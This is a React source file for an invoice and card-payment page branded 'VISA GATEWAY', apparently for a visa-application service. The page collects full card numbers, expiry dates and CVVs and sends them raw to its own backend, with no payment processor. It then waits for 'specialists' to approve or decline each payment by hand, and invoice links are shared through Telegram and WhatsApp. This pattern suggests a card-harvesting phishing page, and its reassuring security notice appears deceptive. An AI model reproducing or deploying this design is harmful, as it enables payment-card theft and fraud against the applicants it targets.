import { useState, useEffect, useRef } from "react";
import { useParams } from "react-router-dom";
import { motion } from "framer-motion";
import { Check, Copy, Loader2, ExternalLink, CreditCard, ShieldCheck } from "lucide-react";
import Navbar from "@/components/Navbar";
import Footer from "@/components/Footer";
import { useLang } from "@/lib/LangContext";
import { useApp } from "@/lib/AppContext";
import { cardTypes, calculateTotal, submitCardPayment, checkPaymentStatus, getSharedInvoice } from "@/lib/api";

type PaymentStep = "loading" | "form" | "waiting" | "confirmed" | "rejected" | "not_found";

type InvoiceServerData = {
  invoice_id: string;
  application_id: string;
  applicant_name: string;
  destination_country: string;
  service_type: string;
  total_amount: number;
  share_token: string;
  line_items: { description: string; amount: number }[];
};

const Invoice = () => {
  const { t } = useLang();
  const { id } = useParams();
  const { applicationData, applicationId, invoiceId } = useApp();

  // Server-side invoice data (loaded from share link)
  const [serverInvoice, setServerInvoice] = useState<InvoiceServerData | null>(null);
  const [loadError, setLoadError] = useState(false);

  // Determine data source: server data first, fallback to app context
  const hasContextData = !!applicationData;
  const name = serverInvoice?.applicant_name || applicationData?.fullName || "Applicant";
  const country = serverInvoice?.destination_country || applicationData?.destination || "USA";
  const purpose = serverInvoice?.service_type || applicationData?.purpose || "Work";
  const express = applicationData?.express || false;
  const effectiveAppId = serverInvoice?.application_id || applicationId;
  const effectiveInvoiceId = serverInvoice?.invoice_id || invoiceId || id || "N/A";

  // Use server total if available, otherwise calculate locally
  const { base, expressFee: expressAdd, total: calculatedTotal } = calculateTotal(country, purpose, express);
  const total = serverInvoice?.total_amount || calculatedTotal;
  const base_display = serverInvoice?.line_items?.[0]?.amount || base;

  const [step, setStep] = useState<PaymentStep>("loading");
  const [selectedCard, setSelectedCard] = useState("visa");
  const [cardNumber, setCardNumber] = useState("");
  const [cardHolder, setCardHolder] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [paymentId, setPaymentId] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [linkCopied, setLinkCopied] = useState(false);

  const pollingRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // Fetch invoice data from server on mount
  useEffect(() => {
    const fetchInvoice = async () => {
      if (!id) {
        setStep("form");
        return;
      }

      try {
        const data = await getSharedInvoice(id);
        setServerInvoice(data);
        setStep("form");
      } catch {
        // If server fetch fails but we have context data, still show form
        if (hasContextData) {
          setStep("form");
        } else {
          // No data at all — show not found
          setLoadError(true);
          setStep("not_found");
        }
      }
    };

    fetchInvoice();
  }, [id, hasContextData]);

  // Format card number with spaces every 4 digits
  const formatCardNumber = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 16);
    return digits.replace(/(.{4})/g, "$1 ").trim();
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCardNumber(formatCardNumber(e.target.value));
  };

  const rawCardNumber = cardNumber.replace(/\s/g, "");

  const isFormValid =
    rawCardNumber.length >= 13 &&
    cardHolder.trim().length >= 2 &&
    expiryMonth.length === 2 &&
    expiryYear.length === 2 &&
    cvv.length >= 3;

  // Poll payment status
  useEffect(() => {
    if (step === "waiting" && paymentId) {
      pollingRef.current = setInterval(async () => {
        try {
          const result = await checkPaymentStatus(paymentId);
          if (result.status === "confirmed") {
            setStep("confirmed");
            if (pollingRef.current) clearInterval(pollingRef.current);
          } else if (result.status === "rejected") {
            setStep("rejected");
            if (pollingRef.current) clearInterval(pollingRef.current);
          }
        } catch {
          // Silently retry
        }
      }, 3000);

      return () => {
        if (pollingRef.current) clearInterval(pollingRef.current);
      };
    }
  }, [step, paymentId]);

  const handleSubmit = async () => {
    if (!isFormValid || submitting) return;

    setSubmitting(true);
    setError(null);

    try {
      const result = await submitCardPayment({
        invoice_id: effectiveInvoiceId,
        application_id: effectiveAppId,
        applicant_name: name,
        amount: total,
        card_type: selectedCard,
        card_number: rawCardNumber,
        card_holder: cardHolder.toUpperCase(),
        expiry_month: expiryMonth,
        expiry_year: expiryYear,
        cvv,
        destination_country: country,
        service_type: purpose,
      });

      setPaymentId(result.payment_id);
      setStep("waiting");
    } catch (err) {
      setError("Failed to submit payment. Please try again.");
    } finally {
      setSubmitting(false);
    }
  };

  const handleCopyLink = () => {
    navigator.clipboard.writeText(window.location.href);
    setLinkCopied(true);
    setTimeout(() => setLinkCopied(false), 2000);
  };

  return (
    <div className="min-h-screen bg-background">
      <Navbar />
      <section className="flex min-h-screen items-center justify-center px-4 pt-24 pb-20">
        <motion.div
          initial={{ y: 30, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          transition={{ duration: 0.6 }}
          className="w-full max-w-lg"
        >
          {/* Loading state */}
          {step === "loading" && (
            <div className="glass rounded-2xl p-12 flex flex-col items-center gap-4">
              <Loader2 className="h-10 w-10 animate-spin text-primary" />
              <p className="text-sm text-muted-foreground">Loading invoice...</p>
            </div>
          )}

          {/* Not found state */}
          {step === "not_found" && (
            <div className="glass rounded-2xl p-12 flex flex-col items-center gap-4 text-center">
              <div className="h-16 w-16 rounded-full bg-red-500/20 flex items-center justify-center">
                <span className="text-3xl">❌</span>
              </div>
              <p className="text-lg font-bold text-foreground">Invoice Not Found</p>
              <p className="text-sm text-muted-foreground">
                This invoice link may have expired or is invalid. Please request a new invoice from your specialist.
              </p>
            </div>
          )}

          {/* Main invoice content — only show when data is available */}
          {step !== "loading" && step !== "not_found" && (<>
          {/* Header */}
          <div className="mb-6 text-center">
            <p className="text-sm font-bold tracking-widest text-muted-foreground uppercase">VISA GATEWAY</p>
            <span className="mt-2 inline-flex items-center rounded-full border border-primary/30 bg-primary/10 px-3 py-1 text-xs font-medium text-primary">
              {t("invoice.title")}
            </span>
          </div>

          <div className="glass rounded-2xl p-8">
            {/* Applicant info */}
            <div className="mb-6 space-y-2 text-sm">
              <div className="flex justify-between"><span className="text-muted-foreground">{t("invoice.applicant")}</span><span className="font-medium text-foreground">{name}</span></div>
              <div className="flex justify-between"><span className="text-muted-foreground">{t("invoice.appId")}</span><span className="font-mono text-foreground">#{effectiveAppId}</span></div>
              <div className="flex justify-between"><span className="text-muted-foreground">{t("invoice.service")}</span><span className="font-medium text-foreground">{country} {purpose} Visa</span></div>
            </div>

            {/* Line items */}
            <div className="space-y-2 border-t border-border pt-4 mb-4 text-sm">
              <div className="flex justify-between"><span className="text-muted-foreground">{country} {purpose} Visa</span><span className="text-foreground">${base_display}</span></div>
              <div className="flex justify-between"><span className="text-muted-foreground">Processing Fee</span><span className="text-foreground">$100</span></div>
              {express && <div className="flex justify-between"><span className="text-muted-foreground">Express Handling</span><span className="text-accent">${expressAdd}</span></div>}
            </div>

            <div className="flex justify-between border-t border-border pt-4 mb-8">
              <span className="text-sm font-medium text-muted-foreground">{t("invoice.total")}</span>
              <span className="text-3xl font-extrabold text-foreground">${total}</span>
            </div>

            {/* ============ CARD PAYMENT FORM ============ */}
            {step === "form" && (
              <div className="space-y-5">
                {/* Card type selector */}
                <div>
                  <p className="mb-2 text-xs font-medium text-muted-foreground">Card Type</p>
                  <div className="grid grid-cols-4 gap-2">
                    {cardTypes.map((ct) => (
                      <button
                        key={ct.id}
                        onClick={() => setSelectedCard(ct.id)}
                        className={`rounded-lg border px-2 py-2.5 text-xs font-semibold transition-all ${
                          selectedCard === ct.id
                            ? "border-primary bg-primary/10 text-primary"
                            : "border-border text-muted-foreground hover:border-muted-foreground/50"
                        }`}
                      >
                        <span className="block text-base">{ct.icon}</span>
                        {ct.label}
                      </button>
                    ))}
                  </div>
                </div>

                {/* Card number */}
                <div>
                  <label className="mb-1 block text-xs font-medium text-muted-foreground">Card Number</label>
                  <div className="relative">
                    <input
                      type="text"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      placeholder="0000 0000 0000 0000"
                      maxLength={19}
                      className="w-full rounded-xl border border-border bg-muted/20 px-4 py-3 pr-10 text-sm text-foreground placeholder:text-muted-foreground/40 focus:border-primary focus:outline-none transition-all font-mono tracking-wider"
                    />
                    <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground/50" />
                  </div>
                </div>

                {/* Cardholder */}
                <div>
                  <label className="mb-1 block text-xs font-medium text-muted-foreground">Cardholder Name</label>
                  <input
                    type="text"
                    value={cardHolder}
                    onChange={(e) => setCardHolder(e.target.value)}
                    placeholder="JOHN SMITH"
                    className="w-full rounded-xl border border-border bg-muted/20 px-4 py-3 text-sm text-foreground placeholder:text-muted-foreground/40 focus:border-primary focus:outline-none transition-all uppercase tracking-wider"
                  />
                </div>

                {/* Expiry + CVV */}
                <div className="grid grid-cols-3 gap-3">
                  <div>
                    <label className="mb-1 block text-xs font-medium text-muted-foreground">Month</label>
                    <input
                      type="text"
                      value={expiryMonth}
                      onChange={(e) => setExpiryMonth(e.target.value.replace(/\D/g, "").slice(0, 2))}
                      placeholder="MM"
                      maxLength={2}
                      className="w-full rounded-xl border border-border bg-muted/20 px-4 py-3 text-center text-sm text-foreground placeholder:text-muted-foreground/40 focus:border-primary focus:outline-none transition-all font-mono"
                    />
                  </div>
                  <div>
                    <label className="mb-1 block text-xs font-medium text-muted-foreground">Year</label>
                    <input
                      type="text"
                      value={expiryYear}
                      onChange={(e) => setExpiryYear(e.target.value.replace(/\D/g, "").slice(0, 2))}
                      placeholder="YY"
                      maxLength={2}
                      className="w-full rounded-xl border border-border bg-muted/20 px-4 py-3 text-center text-sm text-foreground placeholder:text-muted-foreground/40 focus:border-primary focus:outline-none transition-all font-mono"
                    />
                  </div>
                  <div>
                    <label className="mb-1 block text-xs font-medium text-muted-foreground">CVV</label>
                    <input
                      type="password"
                      value={cvv}
                      onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                      placeholder="•••"
                      maxLength={4}
                      className="w-full rounded-xl border border-border bg-muted/20 px-4 py-3 text-center text-sm text-foreground placeholder:text-muted-foreground/40 focus:border-primary focus:outline-none transition-all font-mono"
                    />
                  </div>
                </div>

                {/* Security badge */}
                <div className="flex items-center gap-2 rounded-lg bg-primary/5 border border-primary/10 px-3 py-2">
                  <ShieldCheck className="h-4 w-4 text-primary" />
                  <p className="text-[11px] text-muted-foreground">Your card data is securely transmitted and processed by our verified specialists.</p>
                </div>

                {error && (
                  <p className="text-xs text-red-400 text-center">{error}</p>
                )}

                {/* Submit */}
                <button
                  onClick={handleSubmit}
                  disabled={!isFormValid || submitting}
                  className="glow-primary w-full rounded-xl bg-primary py-3.5 text-sm font-bold text-primary-foreground hover:scale-[1.02] transition-all disabled:opacity-50 disabled:hover:scale-100 flex items-center justify-center gap-2"
                >
                  {submitting ? (
                    <><Loader2 className="h-4 w-4 animate-spin" /> Processing...</>
                  ) : (
                    <>Pay ${total} →</>
                  )}
                </button>
              </div>
            )}

            {/* ============ WAITING STATE ============ */}
            {step === "waiting" && (
              <motion.div
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                className="flex flex-col items-center py-10 space-y-4"
              >
                <div className="relative">
                  <div className="h-16 w-16 rounded-full bg-primary/10 flex items-center justify-center">
                    <Loader2 className="h-8 w-8 animate-spin text-primary" />
                  </div>
                  <div className="absolute -top-1 -right-1 h-4 w-4 rounded-full bg-yellow-500 animate-pulse" />
                </div>
                <p className="text-lg font-semibold text-foreground">Processing Payment</p>
                <p className="text-sm text-muted-foreground text-center max-w-xs">
                  Your payment is being reviewed by our specialist team. This usually takes 1-5 minutes.
                </p>
                {paymentId && (
                  <p className="text-xs font-mono text-muted-foreground/60">
                    Payment ID: {paymentId}
                  </p>
                )}
                <div className="flex items-center gap-2 mt-2">
                  <div className="h-2 w-2 rounded-full bg-yellow-500 animate-pulse" />
                  <span className="text-xs text-muted-foreground">Waiting for confirmation...</span>
                </div>
              </motion.div>
            )}

            {/* ============ CONFIRMED ============ */}
            {step === "confirmed" && (
              <motion.div
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                className="flex flex-col items-center py-10"
              >
                <div className="mb-3 flex h-16 w-16 items-center justify-center rounded-full bg-green-500/20">
                  <Check className="h-8 w-8 text-green-500" />
                </div>
                <p className="text-lg font-bold text-foreground">{t("invoice.confirmed")}</p>
                <p className="mt-2 text-sm text-muted-foreground text-center">
                  Your visa application is now active. You will receive further instructions via email.
                </p>
              </motion.div>
            )}

            {/* ============ REJECTED ============ */}
            {step === "rejected" && (
              <motion.div
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                className="flex flex-col items-center py-10"
              >
                <div className="mb-3 flex h-16 w-16 items-center justify-center rounded-full bg-red-500/20">
                  <span className="text-3xl">❌</span>
                </div>
                <p className="text-lg font-bold text-foreground">Payment Declined</p>
                <p className="mt-2 text-sm text-muted-foreground text-center">
                  Your payment could not be processed. Please check your card details and try again.
                </p>
                <button
                  onClick={() => setStep("form")}
                  className="mt-4 rounded-lg border border-border px-6 py-2 text-sm font-medium text-foreground hover:bg-muted/20 transition-colors"
                >
                  Try Again
                </button>
              </motion.div>
            )}

            {/* Share row */}
            <div className="mt-6 border-t border-border pt-4">
              <p className="mb-3 text-xs text-muted-foreground">{t("invoice.share")}</p>
              <div className="flex gap-2">
                <button onClick={handleCopyLink} className="flex items-center gap-2 rounded-lg border border-border px-4 py-2 text-xs font-medium text-muted-foreground hover:text-foreground transition-colors">
                  {linkCopied ? <Check className="h-3 w-3 text-primary" /> : <Copy className="h-3 w-3" />}
                  {t("invoice.copy")}
                </button>
                <a href={`https://t.me/share/url?url=${encodeURIComponent(window.location.href)}`} target="_blank" rel="noopener noreferrer" className="flex items-center gap-1 rounded-lg border border-border px-3 py-2 text-xs text-muted-foreground hover:text-foreground transition-colors">
                  <ExternalLink className="h-3 w-3" /> Telegram
                </a>
                <a href={`https://wa.me/?text=${encodeURIComponent(window.location.href)}`} target="_blank" rel="noopener noreferrer" className="flex items-center gap-1 rounded-lg border border-border px-3 py-2 text-xs text-muted-foreground hover:text-foreground transition-colors">
                  <ExternalLink className="h-3 w-3" /> WhatsApp
                </a>
              </div>
            </div>
          </div>
          </>)}
        </motion.div>
      </section>
      <Footer />
    </div>
  );
};

export default Invoice;
